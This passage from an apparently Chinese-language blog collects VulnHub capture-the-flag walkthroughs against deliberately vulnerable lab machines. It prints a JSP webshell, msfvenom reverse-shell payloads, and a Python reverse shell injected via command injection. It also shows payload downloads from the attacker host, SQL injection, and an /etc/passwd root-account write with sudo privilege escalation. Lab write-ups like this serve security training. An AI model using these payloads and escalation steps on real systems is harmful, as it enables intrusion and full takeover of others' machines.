/>在压缩zip时，压缩文件的文件名为<code>new1.jsp</code>，而压缩之后的zip文件改名为<code>new2.war</code>，那么在部署之后需要访问<code>/new2/new1.jsp</code></p><p>在第二个后门中查看权限</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/05.png" alt="" /></p><p>在第一个后门中查看文件，但是没有找到nc<br />只好用meterpreter来获取一个shell</p><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=3693 -f elf &gt; hello.elf</code></p><p>然后在第一个后门中上传到目录/tmp下</p><p>在MSF中运行handler</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 3693</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>上传之后是没有X权限的，这时可以在第二个后门中进行赋权<br />但是需要注意一点：要对命令进行url编码，以防止url中的特殊符号导致命令无法执行</p><p>url编码的结果为<code>chmod%20%2Bx%20%2Ftmp%2Fhello.elf</code></p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/06.png" alt="" /></p><p>然后执行meterpreter<br /><code>%2Ftmp%2Fhello.elf</code><br />MSF中就接收到了shell</p><h2 id="权限提升-17"><a class="markdownIt-Anchor" href="#权限提升-17"></a> 权限提升</h2><p>在meterpreter的shell中获取一个pty，以便之后的切换账户操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>这里可以看到tomcat账户可以以任何账户的身份来执行java，而且不需要密码<br />这很可能是提权的一个突破口</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/07.png" alt="" /></p><p>构造密码hash</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/08.png" alt="" /></p><p>构造jar包来执行修改passwd文件的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">cat sudo.java</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class sudo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ProcessBuilder processBuilder &#x3D; new ProcessBuilder();</span><br><span class="line">processBuilder.command(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;echo &#39;test:$6$q.1oPln23FUPQYds$pRZlkAKZ6tN.N4c5kUCKsCF.QW1kdbnLGLTpI3XKgidZuHzbxZzjdONAzoTHgfJHh9NU2E0pO32ICFc5zL78.&#x2F;:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process process &#x3D; processBuilder.start();</span><br><span class="line">            BufferedReader reader &#x3D;</span><br><span class="line">                    new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            int exitCode &#x3D; process.waitFor();</span><br><span class="line">            System.out.println(&quot;\nExited with error code : &quot; + exitCode);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Kali启用HTTP服务<br /><code>python -m 'SimpleHTTPServer' 8800 &amp;</code></p><p>在Shell中使用wget下载java文件<br /><code>wget http://192.168.31.10:8800/sudo.java</code></p><p>执行EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac sudo.java</span><br><span class="line">sudo -u root java sudo</span><br></pre></td></tr></table></figure><p>成功将账户信息写入passwd文件</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/09.png" alt="" /></p><p>切换账户即为root权限</p><p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/10.png" alt="" /></p><hr /><p>JSP后门脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/swyft/articles/5563732.html">jsp.backdoor</a><br /><a href="https://github.com/rohitcoder/BackDoors">jsp.backdoor</a><br /><a href="https://www.runoob.com/java/java-tutorial.html">java</a><br /><a href="https://stackoverflow.com/questions/3403226/how-to-run-linux-commands-in-java">jar</a></p></blockquote><hr /><h1 id="clound-av"><a class="markdownIt-Anchor" href="#clound-av"></a> <a href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/">Clound AV</a></h1><p><code>2020/05/07 22:41:53</code></p><h2 id="寻找靶机ip-2"><a class="markdownIt-Anchor" href="#寻找靶机ip-2"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/00.png" alt="" /></p><h2 id="端口扫描-18"><a class="markdownIt-Anchor" href="#端口扫描-18"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.160</code></p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/01.png" alt="" /></p><h2 id="web路径扫描-2"><a class="markdownIt-Anchor" href="#web路径扫描-2"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.160:8080/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/02.png" alt="" /></p><h2 id="漏洞利用-18"><a class="markdownIt-Anchor" href="#漏洞利用-18"></a> 漏洞利用</h2><p>访问<code>http://192.168.31.160:8080/</code>，如图</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/03.png" alt="" /></p><p>使用burp改变post传递的password的值为%00<br />出现报错页面</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/04.png" alt="" /></p><p>可以看到这里存在sql语句，简单分析后可以判断存在sql注入，注意这里password字段两侧是用双引号，进行sql注入时同样需要使用双引号</p><p>构造语句<code>1&quot; or 1--+</code><br />成功登入页面</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/05.png" alt="" /></p><p>这里通过输入文件名来对文件进行分析，这里自然可以联想到常见的&quot;Ping tool &amp; Code Injection&quot;，显示出<code>ls -l</code>的结果也算是一种提示吧</p><p>本来以为这里是常见的有回显命令注入，但是这个回显实在扫描病毒的结束之后才出现，而且本人进行测试的时候扫描时间很长</p><p>为了判断能否执行命令，在Kali上开启HTTP服务<br /><code>pythom -m SimpleHTTPServer 9990 &amp;</code></p><p>然后尝试命令注入来使用wget下载本地的文件进行测试，以此来判断是否能够进行命令注入，因为开启HTTP服务之后，本地文件被下载是会存在提示的</p><p><code>|wget http://192.168.31.10:9990/1</code></p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/06.png" alt="" /></p><p>可以看到文件被下载，说明可以进行命令注入</p><p>该靶机上没有nc，不过可以通过python来反弹shell</p><p><code>nc -lvvp 9900</code><br /><code>| python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.31.10',9900));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);&quot;</code></p><p>即可获取shell</p><h2 id="权限提升-18"><a class="markdownIt-Anchor" href="#权限提升-18"></a> 权限提升</h2><p>由于未知的原因，本人测试时在nc的shell中输入字符会连续出现两次，用起来有些不方便，只好转到MSF</p><p>生成Meterpreter后门<br /><code>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9995 -f raw &gt; shell.py</code></p><p>在MSF中配置相关参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload python&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9995</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>使用wget传递后门并启用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.31.10:9900&#x2F;shell.py</span><br><span class="line">python shell.py</span><br></pre></td></tr></table></figure><p>在Meterpreter中获取pty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>这时可以看到我们是用户scanner的身份</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/07.png" alt="" /></p><p>在home目录下看到一个C的源代码及其编译的程序</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/08.png" alt="" /></p><p>值得注意的是，这段代码在使用freshclam扫描文件之前，会将该用户变为root，而且该程序也具有SUID权限<br />而该程序需要用户输入文件名，如果我们能够对文件名进行注入，使其扫描文件之后再执行一段代码，那么提权就变得简单了</p><p>构造反弹Shell脚本</p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/09.png" alt="" /></p><p>nc监听相应端口<br /><code>nc -lvvp 9996</code></p><p>执行程序<br /><code>./update_cloudav '1| python test.py'</code></p><p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/10.png" alt="" /></p><hr /><blockquote><p>/console</p></blockquote><p>在访问路径<code>/console</code>时会要求用户输入pin码，这里可以通过修改HTTP Response包中的信息来进行绕过<br />本以为给出的python console可以用来直接执行系统命令，但好像只能用于执行js里的一些函数</p><p>参考资料</p><blockquote><p><a href="https://www.hacknos.com/boredhackerblog-cloud-av-walkthrough/">WalkThrough</a></p></blockquote><hr /><h1 id="hacknos_player"><a class="markdownIt-Anchor" href="#hacknos_player"></a> <a href="https://www.vulnhub.com/entry/hacknos-player-v11,459/">hackNos_Player</a></h1><p><code>2020/05/09 18:39:43</code></p><h2 id="寻找靶机ip-3"><a class="markdownIt-Anchor" href="#寻找靶机ip-3"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/00.png" alt="" /></p><h2 id="端口扫描-19"><a class="markdownIt-Anchor" href="#端口扫描-19"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.33</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/01.png" alt="" /></p><h2 id="web路径扫描-3"><a class="markdownIt-Anchor" href="#web路径扫描-3"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.33/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/02.png" alt="" /></p><h2 id="漏洞利用-19"><a class="markdownIt-Anchor" href="#漏洞利用-19"></a> 漏洞利用</h2><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/03.png" alt="" /></p><p>dirb发现了js代码，粗略审计之后并没有获取到有效的信息</p><p>在Apache默认页面发现如下提示</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/04.png" alt="" /></p><p>路径<code>/g@web/</code>可访问<br />路径<code>/mini@web/</code>不可访问</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/05.png" alt="" /></p><p><code>/g@web/</code>是一个wordpress站点，使用wpscan进行信息收集</p><p><strong>用户枚举</strong></p><p><code>wpscan --url http://192.168.31.33/g@web/ -e u</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/06.png" alt="" /></p><p>访问<code>http://192.168.31.33/g@web/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/07.png" alt="" /></p><p><strong>插件枚举</strong></p><p><code>wpscan --url http://192.168.31.33/g@web/ -e ap</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/08.png" alt="" /></p><p>搜索插件相关信息<br />这里使用searchsploit搜索该插件时缺少了一个RCE的EXP，需要在网上进行搜索</p><p><a href="https://wpvulndb.com/vulnerabilities/8949">https://wpvulndb.com/vulnerabilities/8949</a></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/09.png" alt="" /></p><p>使用该EXP直接获取shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; action&#x3D;&quot;http:&#x2F;&#x2F;192.168.31.33&#x2F;g@web&#x2F;wp-admin&#x2F;admin-ajax.php&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;wpsp_upload_attachment&quot;&gt;</span><br><span class="line">    Choose a file ending with .phtml:</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;0&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p><code>weevely generate pass shell.phtml</code></p><p>上传后在<code>http://192.168.31.33/g@web/wp-content/uploads/</code>找到上传的后门，再使用weevely连接即可获取shell</p><h2 id="权限提升-19"><a class="markdownIt-Anchor" href="#权限提升-19"></a> 权限提升</h2><p>利用当前webshell获取一个MSF的Shell，方便之后进行账户之间的切换</p><p>构造后门程序<br /><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9905 -f raw &gt; pass.php</code></p><p>MSFConsole中进行相应配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use explot&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.33</span><br><span class="line">set LPORT 9905</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>触发MSF后门<br /><code>curl http://192.168.31.33/g@web/wp-content/uploads/wpsp/pass.php</code></p><p>获取shell之后再获取pty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>根据之前找到的JSON的内容，可以使用<code>hackNos@9012!!</code>来提升我们的权限</p><p>查看目录<code>/home</code>的文件夹</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/10.png" alt="" /></p><p>尝试之后转换到用户security的身份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su security</span><br><span class="line">hackNos@9012!!</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/11.png" alt="" /></p><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/12.png" alt="" /></p><p>这里可以使用find命令来进行水平提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; &#x2F;tmp&#x2F;1</span><br><span class="line">sudo -u hackNos-boat find &#x2F;tmp&#x2F;1 -exec &#x2F;bin&#x2F;bash \;</span><br></pre></td></tr></table></figure><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/13.png" alt="" /></p><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/14.png" alt="" /></p><p>然后再使用ruby进行提权</p><p><code>sudo -u hunter /usr/bin/ruby -e 'exec &quot;/bin/bash&quot;'</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/15.png" alt="" /></p><p>查看sudo权限</p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/16.png" alt="" /></p><p>使用gcc进行提权</p><p><code>sudo -u root gcc -wrapper /bin/bash,-s .</code></p><p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/17.png" alt="" /></p><p>即可获取root权限</p><hr /><blockquote><p>gcc -wrapper</p></blockquote><p>最后的gcc提权一开始以为是使用system函数来进行执行命令从而进行提权，但是随后发现这个操作需要SUID权限，最后看WP才发现是使用wrapper参数来执行命令</p><p>参考资料</p><blockquote><p><a href="https://gcc.gnu.org/onlinedocs/gcc/Overall-Options.html#Overall-Options">wrapper</a><br /><a href="https://medium.com/@DamaneDz/vulnhub-hacknos-player-writeup-walkthrough-b91074a0adc4">WalkThrough</a></p></blockquote><hr /><h1 id="dmv_1"><a class="markdownIt-Anchor" href="#dmv_1"></a> <a href="https://www.vulnhub.com/entry/dmv-1,462/">DMV_1</a></h1><p><code>2020/05/14 15:07:33</code></p><h2 id="寻找靶机ip-4"><a class="markdownIt-Anchor" href="#寻找靶机ip-4"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/00.png" alt="" /></p><h2 id="端口扫描-20"><a class="markdownIt-Anchor" href="#端口扫描-20"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.36</code></p><p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/01.png" alt="" /></p><h2 id="web路径扫描-4"><a class="markdownIt-Anchor" href="#web路径扫描-4"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.36/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/02.png" alt="" /></p><h2 id="漏洞利用-20"><a class="markdownIt-Anchor" href="#漏洞利用-20"></a> 漏洞利用</h2><p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/03.png" alt="" /></p><p>Web服务的主页是一个Youtube视频在线转换工具，观察发送的请求包，post数据为URL</p><p>本地开启HTTP服务，并尝试修改URL<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/04.png" alt="" /><br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/05.png" alt="" /><br />猜测可能存在命令注入</p><p>验证存在命令注入漏洞<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/06.png" alt="" /></p><p>使用MSFVenom构造Meterpreter后门<br /><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9995 -f raw &gt; shell.php</code></p><p>在MSFConsole中配置相关参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9995</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>通过命令注入来使用wget下载Meterpreter后门<br /><code>;wget$&#123;IFS&#125;http://192.168.31.10:9900/shell.php;</code></p><p>触发后门<br /><code>curl http://192.168.31.36/shell.php &amp;</code></p><h2 id="权限提升-20"><a class="markdownIt-Anchor" href="#权限提升-20"></a> 权限提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>这里需要使用PSPY来检测后台的root进程<br />PSPY: <a href="https://github.com/DominicBreuker/pspy/releases">https://github.com/DominicBreuker/pspy/releases</a></p><p>这里可以看到root在运行<code>/var/www/html/tmp/clean.sh</code><br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/07.png" alt="" /></p><p>而且该sh脚本可写<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/08.png" alt="" /></p><p>那么可以利用root身份执行命令</p><p>给find命令添加SUID权限<br /><code>echo 'chmod u+s /usr/bin/find' &gt;&gt; clean.sh</code><br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/09.png" alt="" /></p><p>find命令已经获得SUID权限<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/10.png" alt="" /></p><p>使用find命令获取root权限<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/11.png" alt="" /><br />这里可以看到<code>euid=0</code></p><p>查看flag<br /><img src="/images/vulnhub_walkthrough_set/DMV_1/img/12.png" alt="" /></p><hr /><blockquote><p>find -&gt; bash</p></blockquote><p>之前使用find进行SUID进行提权时，执行id可以看到<code>euid=0</code>，但是获取bash时却还是原来的权限，这里使用<code>bash -p</code>则可以保留euid</p><p>参考资料</p><blockquote><p><a href="https://medium.com/@DamaneDz/vulnhub-dmv-1-writeup-walkthrough-c1e12e6659f9">WalkThrough</a></p></blockquote><hr /><h1 id="zion"><a class="markdownIt-Anchor" href="#zion"></a> <a href="https://www.vulnhub.com/entry/zion-11,476/">Zion</a></h1><p><code>2020/05/21 13:09:10</code></p><h2 id="寻找靶机ip-5"><a class="markdownIt-Anchor" href="#寻找靶机ip-5"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/00.png" alt="" /></p><h2 id="端口扫描-21"><a class="markdownIt-Anchor" href="#端口扫描-21"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.1.5</code></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/01.png" alt="" /></p><h2 id="web路径扫描-5"><a class="markdownIt-Anchor" href="#web路径扫描-5"></a> Web路径扫描</h2><p><code>dirb http://192.168.1.5/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/02.png" alt="" /></p><h2 id="漏洞利用-21"><a class="markdownIt-Anchor" href="#漏洞利用-21"></a> 漏洞利用</h2><p>访问Web页面</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/03.png" alt="" /></p><p>点击Truth</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/04.png" alt="" /></p><p>可以看到HTTP Header中存在一些Base编码过的信息</p><p>点击Illusion</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/05.png" alt="" /></p><p>直接Get请求<code>/zion/login.php</code><br /><img src="/images/vulnhub_walkthrough_set/Zion/img/06.png" alt="" /></p><p>对这些信息进行Base64解码</p><p><strong>Truth</strong><br /><img src="/images/vulnhub_walkthrough_set/Zion/img/07.png" alt="" /></p><p>这里提示第二段编码中没有’+’, ‘-’, ‘/’, ‘=’<br />所以是Base62编码</p><p>对第二段编码进行Base62解码<br /><img src="/images/vulnhub_walkthrough_set/Zion/img/08.png" alt="" /><br /><a href="http://decode-base62.nichabi.com/">http://decode-base62.nichabi.com/</a></p><p>这里提示用户名和密码信息存在于选择页面</p><p><strong>Illusion</strong></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/09.png" alt="" /></p><p>信息无效</p><p><strong>Get Request</strong></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/10.png" alt="" /></p><p>信息无效</p><p>使用cewl进行字典生成<br /><code>cewl http://192.168.1.5/ &gt; dic1</code></p><p>转换为小写<br /><code>cat dic1 | tr A-Z a-z &gt; dic2</code></p><p>使用Burp进行账户爆破</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/11.png" alt="" /></p><p>得到账户<code>morpheus.thematrix:interpreted</code></p><p>登陆之后点击上方的Private Key</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/12.png" alt="" /></p><p>注意txt文本的文件名为<br /><code>rsa_priv_key_for_w.rabbit.txt</code></p><p>这里保存本地之后再加上Pri_Key文件的头部与尾部</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/13.png" alt="" /></p><p>SSH登入目标服务器<br /><code>ssh -i pri.key w.rabbit@192.168.1.5</code></p><h2 id="权限提升-21"><a class="markdownIt-Anchor" href="#权限提升-21"></a> 权限提升</h2><p>查看文件<code>warning.txt</code></p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/14.png" alt="" /></p><p>查看mail</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/15.png" alt="" /></p><p>查看sudu权限</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/16.png" alt="" /></p><p>使用sudo权限来进行复制flag文件</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/17.png" alt="" /></p><p>这里可以看到flag文件的权限为600<br />需要在cp文件的同时更改权限，这里使用参数<code>--noreserve mode, ownership</code><br /><img src="/images/vulnhub_walkthrough_set/Zion/img/18.png" alt="" /></p><p>查看flag</p><p><img src="/images/vulnhub_walkthrough_set/Zion/img/19.png" alt="" /></p><hr /><blockquote><p>HTTP信息</p></blockquote><p>根据Post的内容不同，在HTTP Response的Header中给出不同的信息，在实现上并不是难事，思维上也能很快接受这一机制，但是由于之前没有碰到过这种情况，导致在这一步上卡了很久。所以在浏览网页时最好还是使用BurpSuite，以便更加直观地看到全部的信息</p><p>参考资料</p><blockquote><p><a href="https://www.youtube.com/watch?v=jzmaM-s2yEY">WalkThrough</a></p></blockquote><hr /><h1 id="broken-2020"><a class="markdownIt-Anchor" href="#broken-2020"></a> <a href="https://www.vulnhub.com/entry/broken-2020-1,470/">Broken-2020</a></h1><p><code>2020/05/27 09:52:58</code></p><h2 id="寻找靶机ip-6"><a class="markdownIt-Anchor" href="#寻找靶机ip-6"></a> 寻找靶机IP</h2><p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/00.png" alt="" /></p><h2 id="端口扫描-22"><a class="markdownIt-Anchor" href="#端口扫描-22"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.116</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/01.png" alt="" /></p><h2 id="web路径扫描-6"><a class="markdownIt-Anchor" href="#web路径扫描-6"></a> Web路径扫描</h2><p><code>dirb http://192.168.31.116/ -w</code></p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/02.png" alt="" /></p><h2 id="漏洞利用-22"><a class="markdownIt-Anchor" href="#漏洞利用-22"></a> 漏洞利用</h2><p>访问<code>http://192.168.31.116/</code>，无有效信息</p><p>访问<code>http://192.168.31.116/cms/</code>，如图</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/03.png" alt="" /></p><p>根据指示点击按钮</p><p>再次访问<code>http://192.168.31.116/</code>，如图</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/04.png" alt="" /></p><p>页面发生变化</p><p>再次访问<code>http://192.168.31.116/cms/</code>，如图</p><p><img src="/images/vulnhub_walkthrough_set/Broken-2020/img/05.png" alt="" /></p><p>获取第一个flag</p><p>尝试再次扫描Web目录</p><p><img 